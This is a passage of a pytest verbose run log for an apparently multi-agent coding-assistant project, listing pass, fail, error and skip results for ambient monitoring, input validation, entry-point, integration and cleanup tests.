tests/ambient/test_integration.py::TestVSCodeTasksIntegration::test_stop_task_exists PASSED [ 14%]
tests/ambient/test_integration.py::TestEndToEndCapture::test_full_development_workflow_capture FAILED [ 14%]
tests/ambient/test_integration.py::TestEndToEndCapture::test_error_recovery_on_tier1_failure PASSED [ 14%]
tests/ambient/test_integration.py::TestPerformanceCharacteristics::test_debouncer_prevents_excessive_writes PASSED [ 14%]
tests/ambient/test_integration.py::TestPerformanceCharacteristics::test_file_watcher_low_overhead PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_monitor_initialization PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_identifies_test_commands PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_identifies_build_commands PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_identifies_git_commands FAILED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_sanitizes_passwords PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_sanitizes_github_tokens FAILED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_sanitizes_api_keys FAILED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_blocks_malicious_rm_commands FAILED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_blocks_eval_commands PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_blocks_fork_bombs PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_blocks_pipe_to_shell FAILED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_allows_safe_commands PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_rejects_oversized_commands PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_filters_meaningful_commands PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalHistoryMonitoring::test_validates_history_path_exists PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalHistoryMonitoring::test_validates_history_path_is_file PASSED [ 14%]
tests/ambient/test_terminal_monitor.py::TestTerminalHistoryMonitoring::test_validates_history_file_size PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_monitor_initialization PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_get_open_files_with_valid_workspace PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_get_open_files_returns_empty_if_no_workspace PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_get_open_files_handles_invalid_json PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_get_open_files_limits_file_count PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_rejects_oversized_workspace_file PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_sanitize_path_validates_workspace_boundary PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_sanitize_path_handles_invalid_paths PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeMonitor::test_get_active_file_returns_none PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeStateValidation::test_validates_json_structure PASSED [ 15%]
tests/ambient/test_vscode_monitor.py::TestVSCodeStateValidation::test_validates_folder_entries PASSED [ 15%]
tests/edge_cases/test_empty_inputs.py::TestEmptyInputs::test_empty_string_operation PASSED [ 15%]
tests/edge_cases/test_empty_inputs.py::TestEmptyInputs::test_none_operation PASSED [ 15%]
tests/edge_cases/test_empty_inputs.py::TestEmptyInputs::test_empty_list_parameter PASSED [ 15%]
tests/edge_cases/test_empty_inputs.py::TestEmptyInputs::test_empty_dict_config PASSED [ 15%]
tests/edge_cases/test_empty_inputs.py::TestEmptyInputs::test_whitespace_only_input PASSED [ 15%]
tests/edge_cases/test_empty_inputs.py::TestEmptyInputs::test_empty_conversation_context PASSED [ 15%]
tests/edge_cases/test_empty_inputs.py::TestEmptyInputs::test_optional_parameters_omitted PASSED [ 15%]
tests/edge_cases/test_empty_inputs.py::TestEmptyInputs::test_empty_file_path PASSED [ 15%]
tests/edge_cases/test_input_validation.py::test_null_request_handling PASSED [ 15%]
tests/edge_cases/test_input_validation.py::test_empty_string_request_handling PASSED [ 16%]
tests/edge_cases/test_input_validation.py::test_very_large_request_handling PASSED [ 16%]
tests/edge_cases/test_input_validation.py::test_malformed_unicode_handling PASSED [ 16%]
tests/edge_cases/test_input_validation.py::test_sql_injection_prevention PASSED [ 16%]
tests/edge_cases/test_input_validation.py::test_code_injection_prevention PASSED [ 16%]
tests/edge_cases/test_input_validation.py::test_circular_reference_handling PASSED [ 16%]
tests/edge_cases/test_input_validation.py::test_concurrent_same_request_deduplication PASSED [ 16%]
tests/edge_cases/test_input_validation.py::test_invalid_conversation_id_handling PASSED [ 16%]
tests/edge_cases/test_input_validation.py::test_mixed_encoding_request PASSED [ 16%]
tests/edge_cases/test_intent_routing.py::test_ambiguous_intent_resolution PASSED [ 16%]
tests/edge_cases/test_intent_routing.py::test_multiple_conflicting_intents PASSED [ 16%]
tests/edge_cases/test_intent_routing.py::test_zero_confidence_intent_routing PASSED [ 16%]
tests/edge_cases/test_intent_routing.py::test_intent_routing_loop_detection PASSED [ 16%]
tests/edge_cases/test_intent_routing.py::test_malformed_intent_data_handling PASSED [ 16%]
tests/edge_cases/test_intent_routing.py::test_intent_confidence_boundary_cases PASSED [ 16%]
tests/edge_cases/test_malformed_data.py::TestMalformedData::test_invalid_json_config PASSED [ 16%]
tests/edge_cases/test_malformed_data.py::TestMalformedData::test_invalid_yaml_syntax PASSED [ 16%]
tests/edge_cases/test_malformed_data.py::TestMalformedData::test_truncated_database FAILED [ 16%]
tests/edge_cases/test_malformed_data.py::TestMalformedData::test_invalid_operation_name PASSED [ 16%]
tests/edge_cases/test_malformed_data.py::TestMalformedData::test_malformed_natural_language PASSED [ 16%]
tests/edge_cases/test_malformed_data.py::TestMalformedData::test_special_characters_sql_injection PASSED [ 16%]
tests/edge_cases/test_malformed_data.py::TestMalformedData::test_unicode_edge_cases PASSED [ 17%]
tests/edge_cases/test_malformed_data.py::TestMalformedData::test_extremely_long_input PASSED [ 17%]
tests/edge_cases/test_multi_agent_coordination_edge.py::test_agent_handoff_failure_recovery PASSED [ 17%]
tests/edge_cases/test_multi_agent_coordination_edge.py::test_missing_agent_context_handling PASSED [ 17%]
tests/edge_cases/test_multi_agent_coordination_edge.py::test_agent_circular_dependency_detection PASSED [ 17%]
tests/edge_cases/test_multi_agent_coordination_edge.py::test_agent_timeout_during_processing PASSED [ 17%]
tests/edge_cases/test_multi_agent_coordination_edge.py::test_agent_response_conflict_resolution PASSED [ 17%]
tests/edge_cases/test_multi_agent_coordination_edge.py::test_agent_state_corruption_recovery PASSED [ 17%]
tests/edge_cases/test_session_lifecycle.py::test_rapid_session_creation PASSED [ 17%]
tests/edge_cases/test_session_lifecycle.py::test_session_overflow_protection PASSED [ 17%]
tests/edge_cases/test_session_lifecycle.py::test_corrupted_session_data_recovery PASSED [ 17%]
tests/edge_cases/test_session_lifecycle.py::test_session_timeout_exactly_30_minutes PASSED [ 17%]
tests/edge_cases/test_session_lifecycle.py::test_session_with_missing_metadata PASSED [ 17%]
tests/edge_cases/test_session_lifecycle.py::test_session_resume_after_system_restart PASSED [ 17%]
tests/edge_cases/test_session_lifecycle.py::test_session_with_invalid_timestamps PASSED [ 17%]
tests/edge_cases/test_session_lifecycle.py::test_concurrent_session_modifications PASSED [ 17%]
tests/edge_cases/test_tier_failures.py::test_tier1_database_lock_failure PASSED [ 17%]
tests/edge_cases/test_tier_failures.py::test_tier2_knowledge_graph_unavailable PASSED [ 17%]
tests/edge_cases/test_tier_failures.py::test_tier3_context_intelligence_error PASSED [ 17%]
tests/edge_cases/test_tier_failures.py::test_multiple_tier_failures_simultaneously PASSED [ 17%]
tests/edge_cases/test_tier_failures.py::test_tier_recovery_after_failure PASSED [ 17%]
tests/entry_point/test_cortex_entry.py::TestCortexEntryInitialization::test_entry_point_creation PASSED [ 17%]
tests/entry_point/test_cortex_entry.py::TestCortexEntryInitialization::test_entry_point_with_logging PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestCortexEntryInitialization::test_entry_point_without_logging PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSingleRequestProcessing::test_process_simple_request PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSingleRequestProcessing::test_process_with_new_session PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSingleRequestProcessing::test_process_with_existing_session PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSingleRequestProcessing::test_process_logs_to_tier1 PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSingleRequestProcessing::test_process_with_markdown_format PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSingleRequestProcessing::test_process_with_json_format PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSingleRequestProcessing::test_process_with_metadata PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestBatchProcessing::test_process_batch_multiple_messages PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestBatchProcessing::test_process_batch_with_resume PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestBatchProcessing::test_process_batch_without_resume PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSessionManagement::test_get_session_info_active PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSessionManagement::test_get_session_info_no_active PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSessionManagement::test_end_session PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestSessionManagement::test_end_session_no_active PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestHealthStatus::test_get_health_status_healthy PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestHealthStatus::test_get_health_status_tier1_error PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestHealthStatus::test_get_health_status_includes_timestamp PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestErrorHandling::test_process_with_router_error PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestErrorHandling::test_process_batch_with_partial_errors PASSED [ 18%]
tests/entry_point/test_cortex_entry.py::TestIntegrationWithTiers::test_router_receives_tier_apis PASSED [ 19%]
tests/entry_point/test_cortex_entry.py::TestIntegrationWithTiers::test_conversation_logged_to_tier1 PASSED [ 19%]
tests/entry_point/test_cortex_entry.py::TestIntegrationWithTiers::test_health_checks_all_tiers PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestInitialization::test_parser_creation PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestIntentExtraction::test_plan_intent PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestIntentExtraction::test_code_intent PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestIntentExtraction::test_test_intent PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestIntentExtraction::test_fix_intent PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestIntentExtraction::test_commit_intent PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestIntentExtraction::test_resume_intent PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestIntentExtraction::test_health_check_intent PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestIntentExtraction::test_unknown_intent PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestContextExtraction::test_file_path_extraction PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestContextExtraction::test_code_block_extraction PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestContextExtraction::test_inline_file_extraction PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestContextExtraction::test_bug_context_type PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestContextExtraction::test_feature_context_type PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestContextExtraction::test_operation_detection_create PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestContextExtraction::test_operation_detection_modify PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestContextExtraction::test_operation_detection_delete PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestPriorityExtraction::test_critical_priority PASSED [ 19%]
tests/entry_point/test_request_parser.py::TestPriorityExtraction::test_high_priority PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestPriorityExtraction::test_medium_priority PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestPriorityExtraction::test_normal_priority PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestMetadata::test_conversation_id PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestMetadata::test_custom_metadata PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestMetadata::test_parsed_timestamp PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestBatchProcessing::test_batch_parse PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestBatchProcessing::test_batch_with_conversation_id PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestHelperMethods::test_extract_files_from_context PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestHelperMethods::test_extract_files_single_string PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestHelperMethods::test_extract_files_empty PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestHelperMethods::test_infer_agent_type_planner PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestHelperMethods::test_infer_agent_type_code_executor PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestHelperMethods::test_infer_agent_type_unknown PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestRequestValidation::test_validate_valid_request PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestRequestValidation::test_validate_empty_message PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestRequestValidation::test_validate_no_intent PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestRequestValidation::test_validate_unknown_intent_warning PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestEdgeCases::test_empty_message PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestEdgeCases::test_very_long_message PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestEdgeCases::test_message_with_special_characters PASSED [ 20%]
tests/entry_point/test_request_parser.py::TestEdgeCases::test_mixed_case_intent_keywords PASSED [ 21%]
tests/entry_point/test_request_parser.py::TestEdgeCases::test_multiple_intents PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestInitialization::test_formatter_creation PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestTextFormatting::test_format_success_response PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestTextFormatting::test_format_error_response PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestTextFormatting::test_format_with_metadata PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestTextFormatting::test_format_without_metadata PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestTextFormatting::test_format_with_recommendations PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestTextFormatting::test_format_without_recommendations PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestMarkdownFormatting::test_format_markdown_success PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestMarkdownFormatting::test_format_markdown_error PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestMarkdownFormatting::test_format_markdown_details PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestJSONFormatting::test_format_json_success PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestJSONFormatting::test_format_json_error PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestJSONFormatting::test_json_structure PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestBatchFormatting::test_format_batch_multiple_responses PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestBatchFormatting::test_format_batch_with_summary PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestBatchFormatting::test_format_batch_without_summary PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestBatchFormatting::test_format_empty_batch PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestErrorFormatting::test_format_exception PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestErrorFormatting::test_format_exception_with_context PASSED [ 21%]
tests/entry_point/test_response_formatter.py::TestProgressFormatting::test_format_progress_partial PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestProgressFormatting::test_format_progress_complete PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestProgressFormatting::test_format_progress_with_message PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestProgressFormatting::test_format_progress_zero_total PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestRecommendations::test_extract_recommendations_from_next_actions PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestRecommendations::test_extract_next_steps_from_metadata PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestRecommendations::test_default_recommendations_success PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestRecommendations::test_default_recommendations_failure PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestStatusSymbols::test_success_symbol PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestStatusSymbols::test_failure_symbol PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestDataFormatting::test_format_list_result PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestDataFormatting::test_format_dict_result PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestDataFormatting::test_format_simple_result PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestEdgeCases::test_format_empty_response PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestEdgeCases::test_format_response_no_message PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestEdgeCases::test_format_response_with_special_characters PASSED [ 22%]
tests/entry_point/test_response_formatter.py::TestEdgeCases::test_format_very_long_message PASSED [ 22%]
tests/integration/test_agent_coordination.py::TestMultiAgentWorkflow::test_feature_development_full_pipeline ERROR [ 22%]
tests/integration/test_agent_coordination.py::TestMultiAgentWorkflow::test_architecture_planning_workflow ERROR [ 22%]
tests/integration/test_agent_coordination.py::TestCorpusCallosumCoordination::test_tactical_strategic_handoff FAILED [ 22%]
tests/integration/test_agent_coordination.py::TestCorpusCallosumCoordination::test_pattern_learning_feedback_loop FAILED [ 22%]
tests/integration/test_agent_coordination.py::TestLeftBrainAgentCoordination::test_executor_tester_validator_pipeline FAILED [ 23%]
tests/integration/test_agent_coordination.py::TestRightBrainAgentCoordination::test_architect_pattern_matcher_integration FAILED [ 23%]
tests/integration/test_agent_coordination.py::TestAgentErrorHandling::test_executor_failure_doesnt_crash_pipeline FAILED [ 23%]
tests/integration/test_agent_coordination.py::TestAgentErrorHandling::test_invalid_intent_handled_gracefully FAILED [ 23%]
tests/integration/test_agent_coordination.py::TestAgentMemorySharing::test_agents_access_shared_knowledge_graph FAILED [ 23%]
tests/integration/test_agent_coordination.py::TestAgentMemorySharing::test_agents_access_shared_conversation_history FAILED [ 23%]
tests/integration/test_agent_coordination.py::TestConcurrentAgentExecution::test_parallel_independent_operations FAILED [ 23%]
tests/integration/test_complex_intent_routing.py::test_multi_intent_request PASSED [ 23%]
tests/integration/test_complex_intent_routing.py::test_ambiguous_intent_resolution PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestCrossTierReadFlow::test_cross_tier_read_flow PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestCrossTierReadFlow::test_cross_tier_read_with_missing_tier2_data PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestCrossTierReadFlow::test_cross_tier_read_performance PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestCrossTierErrorPropagation::test_cross_tier_error_propagation PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestCrossTierErrorPropagation::test_tier1_failure_blocks_tier2_write PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestCrossTierWriteCoordination::test_cross_tier_write_coordination PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestTierBoundaryEnforcement::test_tier_boundary_enforcement PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestTierBoundaryEnforcement::test_tier_read_permissions PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestCrossTierTransactionRollback::test_cross_tier_transaction_rollback SKIPPED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestTierDataConsistency::test_tier_data_consistency_check PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestConcurrentTierAccess::test_concurrent_tier_access PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestConcurrentTierAccess::test_concurrent_writes_same_tier PASSED [ 23%]
tests/integration/test_cross_tier_workflows.py::TestTierPerformanceUnderLoad::test_tier_performance_under_load PASSED [ 23%]
tests/integration/test_end_to_end_workflows.py::test_add_authentication_full_workflow PASSED [ 24%]
tests/integration/test_end_to_end_workflows.py::test_continue_work_session_resume PASSED [ 24%]
tests/integration/test_end_to_end_workflows.py::test_fix_bug_debug_workflow PASSED [ 24%]
tests/integration/test_end_to_end_workflows.py::test_complex_feature_multi_session PASSED [ 24%]
tests/integration/test_end_to_end_workflows.py::test_learn_from_error_workflow PASSED [ 24%]
tests/integration/test_end_to_end_workflows.py::test_refactor_code_quality_workflow SKIPPED [ 24%]
tests/integration/test_end_to_end_workflows.py::test_documentation_sync_workflow SKIPPED [ 24%]
tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_001_blocks_untested_changes ERROR [ 24%]
tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_001_allows_tested_changes ERROR [ 24%]
tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_002_blocks_untested_integrations ERROR [ 24%]
tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_003_warns_on_css_changes ERROR [ 24%]
tests/integration/test_error_recovery.py::TestSKULLProtectionLayer::test_skull_004_warns_on_immediate_retry ERROR [ 24%]
tests/integration/test_error_recovery.py::TestFailureHandling::test_operation_failure_returns_error_report FAILED [ 24%]
tests/integration/test_error_recovery.py::TestFailureHandling::test_module_failure_doesnt_crash_operation PASSED [ 24%]
tests/integration/test_error_recovery.py::TestFailureHandling::test_missing_dependency_handled_gracefully PASSED [ 24%]
tests/integration/test_error_recovery.py::TestRollbackMechanisms::test_file_creation_rollback_on_failure PASSED [ 24%]
tests/integration/test_error_recovery.py::TestRollbackMechanisms::test_database_rollback_on_failure PASSED [ 24%]
tests/integration/test_error_recovery.py::TestRollbackMechanisms::test_configuration_rollback_on_failure PASSED [ 24%]
tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier0_immutability_enforced ERROR [ 24%]
tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier1_schema_validation ERROR [ 24%]
tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier1_retention_limit_enforced ERROR [ 24%]
tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier2_yaml_validation ERROR [ 25%]
tests/integration/test_error_recovery.py::TestBrainTierProtection::test_tier3_read_only_enforcement ERROR [ 25%]
tests/integration/test_error_recovery.py::TestErrorRecoveryStrategies::test_retry_with_exponential_backoff FAILED [ 25%]
tests/integration/test_error_recovery.py::TestErrorRecoveryStrategies::test_graceful_degradation FAILED [ 25%]
tests/integration/test_error_recovery.py::TestErrorRecoveryStrategies::test_circuit_breaker_pattern PASSED [ 25%]
tests/integration/test_error_recovery.py::TestOperationChainFailures::test_required_module_failure_stops_chain FAILED [ 25%]
tests/integration/test_error_recovery.py::TestOperationChainFailures::test_optional_module_failure_continues_chain FAILED [ 25%]
tests/integration/test_error_recovery.py::TestValidationRules::test_hardcoded_credentials_blocked ERROR [ 25%]
tests/integration/test_error_recovery.py::TestValidationRules::test_low_coverage_warning ERROR [ 25%]
tests/integration/test_multi_agent_coordination.py::test_plan_to_execute_handoff PASSED [ 25%]
tests/integration/test_multi_agent_coordination.py::test_execute_to_test_handoff PASSED [ 25%]
tests/integration/test_multi_agent_coordination.py::test_agent_context_passing PASSED [ 25%]
tests/integration/test_multi_agent_coordination.py::test_parallel_agent_execution PASSED [ 25%]
tests/integration/test_multi_agent_coordination.py::test_agent_conflict_resolution PASSED [ 25%]
tests/integration/test_multi_agent_coordination.py::test_agent_retry_on_failure PASSED [ 25%]
tests/integration/test_phase_5_1_high_priority.py::test_add_authentication_full_workflow PASSED [ 25%]
tests/integration/test_phase_5_1_high_priority.py::test_continue_work_session_resume PASSED [ 25%]
tests/integration/test_phase_5_1_high_priority.py::test_fix_bug_debug_workflow PASSED [ 25%]
tests/integration/test_phase_5_1_high_priority.py::test_plan_to_execute_handoff PASSED [ 25%]
tests/integration/test_phase_5_1_high_priority.py::test_execute_to_test_handoff PASSED [ 25%]
tests/integration/test_phase_5_1_high_priority.py::test_new_session_vs_resumed_session PASSED [ 25%]
tests/integration/test_phase_5_1_high_priority.py::test_session_message_accumulation PASSED [ 26%]
tests/integration/test_phase_5_1_high_priority.py::test_different_intents_processed_correctly PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_refactor_code_quality_workflow FAILED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_document_feature_workflow PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_deploy_feature_workflow PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_parallel_request_isolation PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_concurrent_sessions PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_session_timeout_with_resume PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_session_state_persistence PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_ambiguous_intent_resolution PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_conflicting_intents PASSED [ 26%]
tests/integration/test_phase_5_1_medium_priority.py::test_chained_dependent_intents PASSED [ 26%]
tests/integration/test_session_boundaries.py::test_30_minute_timeout_enforcement PASSED [ 26%]
tests/integration/test_session_boundaries.py::test_session_resume_preserves_conversation_id PASSED [ 26%]
tests/integration/test_session_boundaries.py::test_concurrent_session_handling PASSED [ 26%]
tests/integration/test_session_boundaries.py::test_session_metadata_persistence PASSED [ 26%]
tests/integration/test_session_management.py::TestConversationPersistence::test_save_and_load_conversation SKIPPED [ 26%]
tests/integration/test_session_management.py::TestConversationPersistence::test_save_multiple_conversations SKIPPED [ 26%]
tests/integration/test_session_management.py::TestConversationPersistence::test_conversation_retention_limit SKIPPED [ 26%]
tests/integration/test_session_management.py::TestConversationPersistence::test_conversation_with_context SKIPPED [ 26%]
tests/integration/test_session_management.py::TestResumeWorkflow::test_resume_from_last_conversation SKIPPED [ 26%]
tests/integration/test_session_management.py::TestResumeWorkflow::test_resume_with_no_previous_conversation SKIPPED [ 27%]
tests/integration/test_session_management.py::TestResumeWorkflow::test_resume_specific_conversation_by_id SKIPPED [ 27%]
tests/integration/test_session_management.py::TestContextPreservation::test_pronoun_resolution_across_turns SKIPPED [ 27%]
tests/integration/test_session_management.py::TestContextPreservation::test_multi_turn_conversation_context SKIPPED [ 27%]
tests/integration/test_session_management.py::TestSessionStateManagement::test_active_session_tracking SKIPPED [ 27%]
tests/integration/test_session_management.py::TestSessionStateManagement::test_session_metadata_persistence SKIPPED [ 27%]
tests/integration/test_session_management.py::TestSessionStateManagement::test_concurrent_sessions SKIPPED [ 27%]
tests/integration/test_session_management.py::TestConversationSearchAndRetrieval::test_search_conversations_by_keyword SKIPPED [ 27%]
tests/integration/test_session_management.py::TestConversationSearchAndRetrieval::test_get_conversations_by_date_range SKIPPED [ 27%]
tests/integration/test_session_management.py::TestConversationSearchAndRetrieval::test_get_conversations_by_intent SKIPPED [ 27%]
tests/integration/test_session_management.py::TestSessionRecovery::test_detect_interrupted_session SKIPPED [ 27%]
tests/integration/test_session_management.py::TestSessionRecovery::test_recover_interrupted_session SKIPPED [ 27%]
tests/integration/test_session_management.py::TestConversationContextWindow::test_context_window_limit SKIPPED [ 27%]
tests/integration/test_session_management.py::TestConversationContextWindow::test_context_window_chronological_order SKIPPED [ 27%]
tests/operations/test_cleanup_orchestrator.py::TestCleanupOrchestrator::test_initialization FAILED [ 27%]
tests/operations/test_cleanup_orchestrator.py::TestCleanupOrchestrator::test_metadata FAILED [ 27%]
tests/operations/test_cleanup_orchestrator.py::TestSafetyVerification::test_protected_paths_preserved PASSED [ 27%]
tests/operations/test_cleanup_orchestrator.py::TestSafetyVerification::test_safety_verification PASSED [ 27%]
tests/operations/test_cleanup_orchestrator.py::TestSafetyVerification::test_core_files_protected PASSED [ 27%]
tests/operations/test_cleanup_orchestrator.py::TestBackupManagement::test_backup_detection PASSED [ 27%]
tests/operations/test_cleanup_orchestrator.py::TestBackupManagement::test_github_archival PASSED [ 27%]
tests/operations/test_cleanup_orchestrator.py::TestRootFolderCleanup::test_misplaced_files_detected PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestRootFolderCleanup::test_allowed_root_files_preserved PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestFileReorganization::test_script_reorganization FAILED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestFileReorganization::test_documentation_reorganization PASSED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestMDConsolidation::test_duplicate_detection FAILED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestMDConsolidation::test_newest_file_kept FAILED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestBloatDetection::test_entry_point_bloat_detection FAILED [ 28%]
tests/operations/test_cleanup_orchestrator.py::TestBloatDetection::test_orchestrator_bloat_detection FAILED [ 28%]
